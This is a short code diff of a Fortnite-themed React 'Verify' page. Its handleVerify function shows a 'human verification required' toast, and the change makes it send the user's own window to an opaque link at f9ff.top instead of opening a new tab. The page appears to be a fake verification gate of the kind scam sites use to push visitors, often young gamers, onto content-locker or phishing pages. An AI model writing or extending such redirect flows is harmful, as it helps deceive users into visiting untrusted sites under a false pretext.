@@ -38,15 +38,15 @@ const Verify = () => {
     };
   }, []);
 
-  const handleVerify = () => {
-    toast({
-      title: "Verification Required",
-      description: "Please complete the human verification process.",
-    });
+ const handleVerify = () => {
+  toast({
+    title: "Verification Required",
+    description: "Please complete the human verification process.",
+  });
 
-    // Open the new website
-    window.open("https://f9ff.top/68fcad4", "_blank");
-  };
+  // Redirecționează utilizatorul pe noul site în aceeași fereastră
+  window.location.href = "https://f9ff.top/68fcad4";
+};
 
   return (
     <div className="min-h-screen flex flex-col bg-fortnite-gradient">
